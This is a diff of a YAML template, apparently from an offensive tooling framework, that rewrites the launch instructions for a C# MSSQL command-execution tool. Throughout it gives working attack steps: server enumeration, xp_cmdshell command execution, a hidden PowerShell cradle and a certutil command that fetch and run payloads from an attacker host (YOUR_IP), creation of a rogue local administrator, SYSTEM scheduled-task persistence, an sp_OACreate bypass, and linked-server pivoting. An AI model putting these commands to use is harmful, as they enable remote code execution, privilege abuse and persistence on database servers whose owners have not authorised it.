@@ -60,94 +60,41 @@ output:
   launch_instructions: |
     C# MSSQL Command Execution - Launch Instructions
 
-    Prerequisites:
-
-    - Valid Windows domain credentials with access to MSSQL server
-    - Sysadmin role on target MSSQL server (or db_owner + elevated permissions)
-    - Network access to MSSQL port (default 1433)
-    - .NET Framework on execution machine
-
-    Step 1: Enumerate MSSQL Servers
-
-    Find MSSQL servers in the domain:
-
-    PowerShell:
-    Get-SQLInstanceDomain
-
-    Or using PowerUpSQL:
-    Import-Module PowerUpSQL
-    Get-SQLInstanceBroadcast
-    Get-SQLInstanceScanUDP
-
-    Or manual port scan:
+    Enumerate MSSQL Servers:
     nmap -p 1433 --open 192.168.1.0/24
+    Get-SQLInstanceDomain
+    Import-Module PowerUpSQL; Get-SQLInstanceBroadcast
 
-    Step 2: Execute Commands
+    Execute Commands:
+    {{ output_file }} {{ mssql_server }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
 
-    Basic command execution:
-    {{ output_file }} {{ mssql_server }} "whoami"
-
-    Check current user:
-    {{ output_file }} {{ mssql_server }} "whoami /all"
-
-    List directory:
-    {{ output_file }} {{ mssql_server }} "dir C:\\Users"
-
-    Download and execute payload:
-    {{ output_file }} {{ mssql_server }} "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
-
-    Add local admin:
+    Example - Add Local Admin:
     {{ output_file }} {{ mssql_server }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
 
-    Step 3: Establish Persistence
+    Example - Download and Execute:
+    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://YOUR_IP/beacon.exe C:\\Temp\\beacon.exe && C:\\Temp\\beacon.exe"
 
-    Create scheduled task:
-    {{ output_file }} {{ mssql_server }} "schtasks /create /tn Update /tr C:\\Windows\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"
-
-    Or download and execute beacon:
-    {{ output_file }} {{ mssql_server }} "certutil -urlcache -f http://YOUR_IP/beacon.exe C:\\Windows\\Temp\\beacon.exe && C:\\Windows\\Temp\\beacon.exe"
+    Example - Persistence:
+    {{ output_file }} {{ mssql_server }} "schtasks /create /tn Update /tr C:\\Temp\\beacon.exe /sc onlogon /ru SYSTEM"
 
     Notes:
-
+    - Target: {{ mssql_server }} (port 1433)
     - Uses Integrated Windows Authentication (current user context)
-    - Commands execute as SQL Server service account (often NT SERVICE\\MSSQLSERVER or domain account)
-    - Automatically enables xp_cmdshell if disabled
+    - Commands execute as SQL Server service account (often NT SERVICE\MSSQLSERVER or domain account)
+    - Automatically enables xp_cmdshell if disabled (requires sysadmin role)
     - Cleans up by disabling xp_cmdshell after execution
-    - Requires sysadmin role on target MSSQL server
-    - Tool shows sysadmin status before executing
-
-    Common SQL Server Service Accounts:
-
-    - NT SERVICE\\MSSQLSERVER (local system)
-    - NT AUTHORITY\\NETWORK SERVICE
-    - domain\\sql_svc (domain service account - often over-privileged)
-
-    Advanced Techniques:
-
-    Linked server enumeration:
-    SELECT * FROM sys.servers WHERE is_linked = 1
-
-    Execute on linked server:
-    EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
-
-    Impersonation:
-    EXECUTE AS LOGIN = 'sa'
+    - Tool displays sysadmin status before executing
+    - Common service accounts: NT SERVICE\MSSQLSERVER, domain\sql_svc (often over-privileged)
+    - Alternative to xp_cmdshell: sp_OACreate (if xp_cmdshell blocked)
+    - Linked servers: Use `EXEC ('xp_cmdshell ''cmd''') AT [LINKED_SERVER]` for pivoting
 
     Troubleshooting:
-
-    - Access Denied: Check SQL Server permissions (need sysadmin or db_owner + CONTROL SERVER)
-    - Connection fails: Verify port 1433 is open, SQL Server allows remote connections
-    - xp_cmdshell disabled and can't enable: Not sysadmin or explicitly denied
-    - No output: Command may have failed or no stdout (try writing to file)
-
-    Alternative Execution Methods:
-
-    Using sp_OACreate (if xp_cmdshell blocked):
-    DECLARE @output INT
-    EXEC sp_OACreate 'wscript.shell', @output OUTPUT
-    EXEC sp_OAMethod @output, 'run', NULL, 'cmd.exe /c whoami > C:\\temp\\out.txt'
+    - Access Denied: Check SQL permissions (need sysadmin or db_owner + CONTROL SERVER)
+    - Connection fails: Verify port 1433 open; SQL Server allows remote connections; firewall rules
+    - xp_cmdshell disabled and can't enable: Not sysadmin or explicitly denied via policy
+    - No output: Command may have failed or no stdout (redirect to file: >C:\temp\out.txt)
+    - Integrated auth fails: Try SQL authentication with -U user -P password flags
+    - Consider linked server enumeration: `SELECT * FROM sys.servers WHERE is_linked = 1`
 
     Cleanup:
-
-    Remove executable:
     Remove-Item {{ output_file }} -Force
